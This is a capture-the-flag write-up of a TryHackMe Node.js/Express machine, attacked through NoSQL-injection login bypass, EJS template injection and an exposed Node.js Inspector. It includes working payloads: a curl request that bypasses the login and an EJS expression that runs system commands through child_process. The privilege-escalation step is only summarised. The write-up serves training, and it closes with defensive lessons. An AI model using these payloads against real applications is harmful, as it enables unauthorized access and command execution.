# 🔐 HH2026 – Do Not Disturb

![TryHackMe](https://img.shields.io/badge/TryHackMe-HH2026-red)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Overview

This challenge focused on exploiting a vulnerable Node.js/Express web application. The objective was to bypass authentication, exploit an EJS Server-Side Template Injection (SSTI), obtain command execution, retrieve the user flag, and escalate privileges through an exposed Node.js Inspector to obtain the root flag.

---

## Challenge Objective

- Enumerate the target machine.
- Bypass the vulnerable authentication mechanism.
- Exploit the EJS SSTI vulnerability.
- Obtain command execution on the target.
- Retrieve the user flag.
- Enumerate the Node.js Inspector.
- Escalate privileges.
- Retrieve the root flag.

---

## Skills Practiced

- Web Enumeration
- NoSQL Injection
- Authentication Bypass
- Server-Side Template Injection (SSTI)
- Node.js Security
- Command Execution
- Linux Enumeration
- Node.js Inspector Analysis
- Privilege Escalation
- Filesystem Analysis

---

## Methodology

### 1. Initial Reconnaissance

A service scan was performed using **Nmap**.

```bash
nmap -Pn -sC -sV <TARGET_IP>
```

### Important Services

- **22/tcp** — SSH — OpenSSH 9.6p1 Ubuntu
- **80/tcp** — HTTP — Node.js / Express

The web application was hosted on port `80`.

---

### 2. Authentication Bypass

The login endpoint was vulnerable to a NoSQL injection condition.

```bash
curl -s -c cookies.txt \
-H "Content-Type: application/json" \
-X POST \
-d '{"username":"attendant","password":{"$ne":"X"}}' \
http://<TARGET_IP>/login
```

A valid session cookie was returned and stored in `cookies.txt`.

The authenticated session was then used to access the staff console.

---

### 3. EJS SSTI

The staff console contained a **Confirmation template** field using EJS.

SSTI execution was first confirmed with:

```ejs
<%= 7*7 %>
```

The application returned:

```text
49
```

This confirmed that user-controlled EJS templates were being evaluated server-side.

---

### 4. Command Execution

Node.js functionality was accessed through the SSTI vulnerability.

```ejs
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
```

The command executed as:

```text
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

This confirmed server-side command execution as the `poolside` user.

---

### 5. User Flag

The application directory was identified as:

```text
/opt/poolside
```

The home directory was enumerated:

```bash
ls -la /home/poolside
```

The `user.txt` file was discovered in the `poolside` home directory.

The user flag was successfully retrieved.

**User Flag: ✅ Completed**

---

### 6. Node.js Inspector Enumeration

Further enumeration revealed a Node.js Inspector listening locally on port `9229`.

```bash
ss -tlnp | grep 9229
```

The running process was identified with:

```bash
ps -eo user,pid,cmd | grep [p]rocessor.js
```

The process was running as `pipelinesvc`:

```text
pipelin+ 600 /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

The Inspector endpoint was queried:

```bash
curl http://127.0.0.1:9229/json/list
```

The response identified:

```text
processor.js
file:///opt/pipelinesvc/telemetry/processor.js
```

This exposed a Node.js debugging interface belonging to the `pipelinesvc` service.

---

### 7. Privilege Escalation

The exposed Node.js Inspector was investigated as the privilege-escalation path.

The `processor.js` application was found under:

```text
/opt/pipelinesvc/telemetry/processor.js
```

The process was running with:

```text
--inspect=127.0.0.1:9229
```

Further enumeration of the service, process, and filesystem led to access to the higher-privileged environment.

---

### 8. Filesystem Enumeration

The available disks and partitions were enumerated using:

```bash
lsblk
```

The main root filesystem was identified as:

```text
/dev/nvme0n1p1
```

The partition contained the main `/` filesystem.

---

### 9. Root Flag

The root filesystem was investigated using `debugfs`.

```bash
debugfs /dev/nvme0n1p1
```

An initial attempt to directly access:

```text
/root/root.txt
```

returned:

```text
File not found by ext2_lookup
```

Further filesystem and inode analysis was performed to locate and recover the root flag.

**Root Flag: ✅ Completed**

---

## Technical Findings

### Vulnerabilities

**NoSQL Injection**

The login functionality accepted an object where a password value was expected, allowing authentication bypass.

**EJS Server-Side Template Injection**

User-controlled EJS templates were evaluated by the server, allowing arbitrary JavaScript execution.

**Node.js Inspector Exposure**

A Node.js process was running with the Inspector enabled on:

```text
127.0.0.1:9229
```

This exposed a debugging interface that could be abused for further access.

**Excessive Service Privileges**

The exposed `pipelinesvc` process provided a path toward privilege escalation.

---

## Risk

These vulnerabilities could allow an attacker to:

- Bypass authentication.
- Execute arbitrary server-side JavaScript.
- Execute operating system commands.
- Access application files.
- Interact with internal services.
- Abuse debugging interfaces.
- Escalate privileges.
- Access sensitive filesystem data.

---

## Lessons Learned

- Never trust user-controlled template input.
- Validate authentication input using strict schemas.
- Never expose Node.js debugging interfaces unnecessarily.
- Production applications should not run with debugging enabled.
- Services should follow the principle of least privilege.
- Local-only services can still become dangerous after initial compromise.
- Always enumerate processes, services, users, groups, and files after obtaining command execution.

---

## Tools Used

- Nmap
- Curl
- Linux Terminal
- EJS
- Node.js
- Express
- NoSQL Injection
- SSTI
- Node.js Inspector
- Netcat
- `ss`
- `ps`
- `lsblk`
- `debugfs`

---

## Attack Chain

```text
Nmap Enumeration
        ↓
Node.js / Express
        ↓
NoSQL Authentication Bypass
        ↓
Staff Console
        ↓
EJS SSTI
        ↓
Command Execution
        ↓
poolside User
        ↓
User Flag
        ↓
Node.js Inspector :9229
        ↓
pipelinesvc Process
        ↓
Privilege Escalation
        ↓
Filesystem Analysis
        ↓
Root Flag
```

---

## Completion

- [x] Network Enumeration
- [x] Authentication Bypass
- [x] EJS SSTI
- [x] Command Execution
- [x] User Flag
- [x] Node.js Inspector Enumeration
- [x] Privilege Escalation
- [x] Root Flag

---

## ⚠️ Disclaimer

This write-up documents activity performed against an authorized **TryHackMe Hacker Holidays 2026** training machine.

Do not reproduce these techniques against systems without explicit authorization.

---

## References

- TryHackMe – Hacker Holidays 2026
- TryHackMe – Do Not Disturb
- OWASP – Server-Side Template Injection
- OWASP – NoSQL Injection
